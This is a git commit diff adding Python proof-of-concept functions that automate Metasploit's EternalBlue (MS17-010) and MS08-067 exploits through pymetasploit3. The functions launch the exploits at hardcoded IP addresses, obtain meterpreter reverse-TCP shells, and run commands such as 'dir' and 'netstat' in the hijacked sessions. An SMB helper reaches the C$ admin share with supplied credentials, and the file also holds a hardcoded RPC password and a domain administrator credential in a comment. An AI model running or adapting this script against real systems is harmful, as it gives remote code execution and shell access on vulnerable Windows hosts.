d4023a5aaf43880c812726c816042eb114ccff17
root <alexboy60318@gmail.com>
2020-10-18 06:28:43 -0400

    add ms08067_poc

--- data_poc.py
+++ data_poc.py
@@ -3,7 +3,6 @@ import smbclient
 from pymetasploit3.msfrpc import MsfRpcClient
 
 def smb_account_poc(username,password,domain,ipaddress):
-    
     try:
         smb = smbclient.SambaClient(server=ipaddress, share="C$", username=username, password=password, domain=domain)
         exploit_folder = smb.listdir('/')
@@ -14,22 +13,38 @@ def smb_account_poc(username,password,domain,ipaddress):
 def ms17010_poc():
     client = MsfRpcClient('1qaz@WSX', ssl=False)
     exploit = client.modules.use('exploit','windows/smb/ms17_010_eternalblue')
-    exploit['RHOSTS']  = "10.10.91.87"
-    job_id = exploit.execute(payload='windows/x64/meterpreter/bind_tcp')['job_id']
-    #{'job_id': 1, 'uuid': '3whbuevf'
+    exploit['RHOSTS']  = "10.10.247.206"
+    exploit.execute(payload='windows/x64/meterpreter/reverse_tcp')
+    session_number = list(client.sessions.list.keys())[0]
+    print(session_number)
     if bool(client.sessions.list):
-        shell = client.sessions.session('1')
+        shell = client.sessions.session(session_number)
         shell.write('dir')
         result = shell.read()
+        print(result)
         result.split(' ')
-        print(result[:240:])
-
-
-ms17010_poc()
-# account_poc_information = smb_account_poc('Administrator','1qaz@WSX','alex-ad.local',"192.168.89.214")
-# print(account_poc_information)
-
-
-from pymetasploit3.msfrpc import MsfRpcClient
-client = MsfRpcClient('1qaz@WSX', ssl=False)
-exploit = client.modules.use('exploit','windows/smb/ms17_010_eternalblue')
+        return result[:240:]
+    else:
+        print("null")
+        return "NULL"
+def ms08067_poc():
+    client = MsfRpcClient('1qaz@WSX', ssl=False)
+    exploit = client.modules.use('exploit','windows/smb/ms08_067_netapi')
+    exploit['RHOSTS']  = "192.168.1.5"
+    exploit.execute(payload='windows/meterpreter/reverse_tcp')
+    print("here")
+    session_number = list(client.sessions.list.keys())[0]
+    print(session_number)
+    if bool(client.sessions.list):
+        shell = client.sessions.session(session_number)
+        shell.write('netstat')
+        result = shell.read()
+        print(result)
+        result.split(' ')
+        print(result)
+        return result[:240:]
+    else:
+        print("null")
+        return "NULL"
+# ms17010_exploit_data = ms17010_poc()
+ms08067_poc()
